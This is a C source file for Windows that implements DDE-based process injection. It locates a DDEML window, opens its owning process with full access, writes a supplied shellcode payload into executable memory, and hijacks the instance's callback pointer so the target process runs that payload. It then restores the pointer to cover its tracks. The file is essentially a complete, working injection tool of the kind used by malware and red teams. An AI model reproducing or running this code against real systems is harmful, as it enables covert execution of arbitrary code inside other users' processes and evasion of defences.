/**
  Copyright © 2019 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */
  
#include "../ntlib/util.h"

PWCHAR wnd2proc(HWND hw) {
    PWCHAR         name=L"N/A";
    DWORD          pid;
    HANDLE         ss;
    BOOL           bResult;
    PROCESSENTRY32 pe;
    
    GetWindowThreadProcessId(hw, &pid);
    
    ss = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    
    if(ss != INVALID_HANDLE_VALUE) {
      pe.dwSize = sizeof(PROCESSENTRY32);
      
      bResult = Process32First(ss, &pe);
      while (bResult) {
        if (pe.th32ProcessID == pid) {
          name = pe.szExeFile;
          break;
        }
        bResult = Process32Next(ss, &pe);
      }
      CloseHandle(ss);
    }
    return name;
}

typedef struct tagLINK_COUNT *PLINK_COUNT;
typedef ATOM LATOM;

typedef struct tagSERVER_LOOKUP {
    LATOM           laService;
    LATOM           laTopic;
    HWND            hwndServer;
} SERVER_LOOKUP, *PSERVER_LOOKUP;

typedef struct tagCL_INSTANCE_INFO {
    struct tagCL_INSTANCE_INFO *next;
    HANDLE                      hInstServer;
    HANDLE                      hInstClient;
    DWORD                       MonitorFlags;
    HWND                        hwndMother;
    HWND                        hwndEvent;
    HWND                        hwndTimeout;
    DWORD                       afCmd;
    PFNCALLBACK                 pfnCallback;
    DWORD                       LastError;
    DWORD                       tid;
    LATOM                      *plaNameService;
    WORD                        cNameServiceAlloc;
    PSERVER_LOOKUP              aServerLookup;
    short                       cServerLookupAlloc;
    WORD                        ConvStartupState;
    WORD                        flags;              // IIF_ flags
    short                       cInDDEMLCallback;
    PLINK_COUNT                 pLinkCount;
} CL_INSTANCE_INFO, *PCL_INSTANCE_INFO;

#define GWLP_INSTANCE_INFO 0 // PCL_INSTANCE_INFO

VOID dde_inject(LPVOID payload, DWORD payloadSize) {
    HWND             hw;
    SIZE_T           rd, wr;
    LPVOID           ptr, cs;
    HANDLE           hp;
    CL_INSTANCE_INFO pcii;
    CONVCONTEXT      cc;
    HCONVLIST        cl;
    DWORD            pid, idInst = 0;
    
    // 1. find a DDEML window and read the address 
    //    of CL_INSTANCE_INFO
    hw = FindWindowEx(NULL, NULL, L"DDEMLMom", NULL);
    if(hw == NULL) return;
    ptr = (LPVOID)GetWindowLongPtr(hw, GWLP_INSTANCE_INFO);
    if(ptr == NULL) return;
      
    // 2. open the process and read CL_INSTANCE_INFO
    GetWindowThreadProcessId(hw, &pid);
    hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if(hp == NULL) return;
    ReadProcessMemory(hp, ptr, &pcii, sizeof(pcii), &rd);
    
    // 3. allocate RWX memory and write payload there.
    //    update callback
    cs = VirtualAllocEx(hp, NULL, payloadSize, 
      MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(hp, cs, payload, payloadSize, &wr);
    WriteProcessMemory(
      hp, (PBYTE)ptr + offsetof(CL_INSTANCE_INFO, pfnCallback), 
      &cs, sizeof(ULONG_PTR), &wr);
            
    // 4. trigger execution via DDE protocol
    DdeInitialize(&idInst, NULL, APPCLASS_STANDARD, 0);
    ZeroMemory(&cc, sizeof(cc));
    cc.cb = sizeof(cc);
    cl = DdeConnectList(idInst, 0, 0, 0, &cc);
    DdeDisconnectList(cl);
    DdeUninitialize(idInst);
    
    // 5. restore original pointer and cleanup
    WriteProcessMemory(
      hp, 
      (PBYTE)ptr + offsetof(CL_INSTANCE_INFO, pfnCallback), 
      &pcii.pfnCallback, sizeof(ULONG_PTR), &wr);
          
    VirtualFreeEx(hp, cs, 0, MEM_DECOMMIT | MEM_RELEASE);
    CloseHandle(hp);
}

VOID dde_list(VOID) {
    CONVCONTEXT cc;
    HCONVLIST   cl;
    DWORD       idInst = 0;
    HCONV       c = NULL;
    CONVINFO    ci;
    WCHAR       server[MAX_PATH];
    
    if(DMLERR_NO_ERROR != DdeInitialize(&idInst, NULL, APPCLASS_STANDARD, 0)) {
      printf("unable to initialize : %i.\n", GetLastError());
      return;
    }
    
    ZeroMemory(&cc, sizeof(cc));
    cc.cb = sizeof(cc);
    cl = DdeConnectList(idInst, 0, 0, 0, &cc);
    
    if(cl != NULL) {
      for(;;) {
        c = DdeQueryNextServer(cl, c);
        if(c == NULL) break;
        ci.cb = sizeof(ci);
        DdeQueryConvInfo(c, QID_SYNC, &ci);
        DdeQueryString(idInst, ci.hszSvcPartner, server, MAX_PATH, CP_WINUNICODE);
        
        printf("Service : %-10ws Process : %ws\n", 
          server, wnd2proc(ci.hwndPartner));
      }
      DdeDisconnectList(cl);
    } else {
      printf("DdeConnectList : %x\n", DdeGetLastError(idInst));
    }
    DdeUninitialize(idInst);
}

int main(void) {
    LPVOID  pic;
    DWORD   len;
    int     argc;
    wchar_t **argv;
    
    argv = CommandLineToArgvW(GetCommandLineW(), &argc);
    
    if(argc != 2) {
      dde_list();
      printf("\n\nusage: dde_inject <payload>.\n");
      return 0;
    }

    len=readpic(argv[1], &pic);
    if (len==0) { printf("\ninvalid payload\n"); return 0;}
    
    dde_inject(pic, len);
    
    return 0;
}